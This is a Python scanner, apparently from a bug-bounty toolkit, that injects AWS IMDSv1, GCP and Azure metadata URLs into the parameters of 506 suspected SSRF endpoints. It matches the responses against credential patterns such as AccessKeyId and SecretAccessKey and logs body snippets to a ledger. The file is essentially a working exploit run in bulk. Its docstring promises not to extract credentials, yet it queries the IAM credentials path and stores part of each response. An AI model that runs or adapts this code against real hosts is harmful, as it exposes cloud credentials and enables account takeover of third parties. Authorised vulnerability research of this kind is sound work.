#!/usr/bin/env python3
"""
verify-ssrf-to-cloud-metadata — scanner #74.

Re-probes our existing 506 SSRF candidates against cloud metadata endpoints
(AWS IMDSv1, GCP, Azure). If any candidate proxies to 169.254.169.254 or
the GCP/Azure equivalents, we get cloud credentials → full cloud-account
takeover.

Why $50K+ class:
  - AWS IAM creds via IMDSv1 = $50K-$250K (Capital One class)
  - GCP service account tokens = $50K-$100K
  - Azure managed identity tokens = $50K-$100K

Strategy (passive, ethical):
  1. For each SSRF candidate from existing ledger
  2. Send request with the SSRF parameter pointing to metadata endpoint
  3. Look for cloud-metadata response patterns in body:
     - AWS IMDSv1: instance-id, ami-id, hostname patterns
     - GCP: project info, service-accounts/ listing
     - Azure: instance/compute/azEnvironment patterns
  4. If credentials are visible: STOP, do not extract. Document evidence.
  5. NEVER pivot, NEVER use the creds, NEVER list IAM permissions

We do NOT exfiltrate credentials. We confirm metadata reachability and stop.

Usage:
  verify-ssrf-to-cloud-metadata.py
"""
from __future__ import annotations
import argparse, json, urllib.request, urllib.error, urllib.parse, ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from pathlib import Path

UA = "Lictor-SSRF-MetadataVerify/0.1 (+https://lictor-ai.com)"

# Cloud metadata endpoints
METADATA_TARGETS = {
    "aws-imdsv1-root": "http://169.254.169.254/latest/meta-data/",
    "aws-imdsv1-iam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp-metadata": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "gcp-project": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "azure-imds": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
}

# Response patterns that indicate metadata access success
METADATA_PATTERNS = {
    "aws-imdsv1-root": ["instance-id", "ami-id", "hostname", "local-ipv4", "iam/"],
    "aws-imdsv1-iam": ["AccessKeyId", "SecretAccessKey", "Token"],
    "gcp-metadata": ["project-id", "instance/id", "service-accounts/"],
    "gcp-project": [],  # any 200 response with a string is the project ID
    "azure-imds": ["compute", "azEnvironment", "subscriptionId"],
}

@dataclass
class SSRFMetaFinding:
    candidate_host: str
    ssrf_endpoint: str
    ssrf_param: str
    metadata_target: str
    metadata_target_url: str
    response_status: int
    matched_patterns: list = field(default_factory=list)
    body_snippet: str = ""
    severity: str = "INFO"
    notes: str = ""

def http_test_ssrf(ssrf_url: str, target_metadata_url: str, timeout: int = 10) -> dict | None:
    """Send the SSRF candidate URL with metadata target as the SSRF payload."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Encode the target URL into the SSRF parameter
    req = urllib.request.Request(ssrf_url, headers={
        "User-Agent": UA,
        # GCP requires this header to access metadata
        "Metadata-Flavor": "Google",
        # Azure requires this
        "Metadata": "true",
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(20_000).decode("utf-8", "replace")
            return {"status": r.status, "body": body}
    except urllib.error.HTTPError as e:
        try: body = e.read(20_000).decode("utf-8", "replace")
        except: body = ""
        return {"status": e.code, "body": body}
    except Exception:
        return None

def check_candidate(candidate: dict) -> list[SSRFMetaFinding]:
    """For each SSRF candidate, test against each metadata target."""
    host = candidate.get("host", "")
    endpoint = candidate.get("endpoint", candidate.get("url", ""))
    param = candidate.get("param", candidate.get("parameter", ""))
    if not endpoint or not param:
        return []

    findings = []
    for target_name, target_url in METADATA_TARGETS.items():
        # Build the SSRF URL by replacing the parameter value with metadata URL
        encoded_target = urllib.parse.quote(target_url, safe='')
        # Try replacing the param value (common pattern)
        if f"{param}=" in endpoint:
            ssrf_url = endpoint.split(f"{param}=")[0] + f"{param}={encoded_target}"
        else:
            ssrf_url = f"{endpoint}{'&' if '?' in endpoint else '?'}{param}={encoded_target}"

        result = http_test_ssrf(ssrf_url, target_url)
        if not result: continue
        body = result["body"]

        # Match against metadata patterns
        matched = [p for p in METADATA_PATTERNS.get(target_name, [])
                  if p.lower() in body.lower()]
        if matched:
            severity = "CRITICAL" if target_name.endswith("iam") else "HIGH"
            notes = (f"SSRF→metadata confirmed: {target_name} returned patterns {matched}. "
                    f"DO NOT extract credentials — submit immediately.")
            findings.append(SSRFMetaFinding(
                candidate_host=host, ssrf_endpoint=endpoint, ssrf_param=param,
                metadata_target=target_name, metadata_target_url=target_url,
                response_status=result["status"],
                matched_patterns=matched, body_snippet=body[:200].replace('\n', ' '),
                severity=severity, notes=notes))
            # Stop testing more targets for this candidate — one hit is enough
            break

    return findings

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--candidates",
                    default="/Users/raffa/Lictor/v3/ledgers/ssrf-candidates.jsonl")
    ap.add_argument("--threads", type=int, default=6)
    ap.add_argument("--max", type=int, default=506)
    ap.add_argument("--ledger",
                    default="/Users/raffa/Lictor/v3/ledgers/ssrf-to-cloud-metadata.jsonl")
    args = ap.parse_args()

    candidates = []
    for line in Path(args.candidates).read_text().splitlines():
        try:
            candidates.append(json.loads(line))
        except: continue
    candidates = candidates[:args.max]
    print(f"[+] Re-probing {len(candidates)} SSRF candidates against cloud metadata")
    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)

    n_crit = n_high = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(check_candidate, c): c for c in candidates}
        done = 0
        for fut in as_completed(futures):
            done += 1
            try:
                hits = fut.result()
            except Exception:
                continue
            for f in hits:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                tag = {"CRITICAL": "🔴", "HIGH": "🟠"}.get(f.severity, "?")
                print(f"  [{done}/{len(candidates)}] {tag} {f.candidate_host} → {f.metadata_target}")
                print(f"      patterns: {f.matched_patterns}")
                if f.severity == "CRITICAL": n_crit += 1
                elif f.severity == "HIGH": n_high += 1
            # Progress every 50
            if done % 50 == 0:
                print(f"  [progress] {done}/{len(candidates)} — {n_crit} CRIT + {n_high} HIGH")
    print(f"\n[+] Done. CRITICAL={n_crit} HIGH={n_high}")
    print(f"[+] 🔴 CRITICAL = AWS IAM creds accessible — IMMEDIATE submission")

if __name__ == "__main__":
    main()
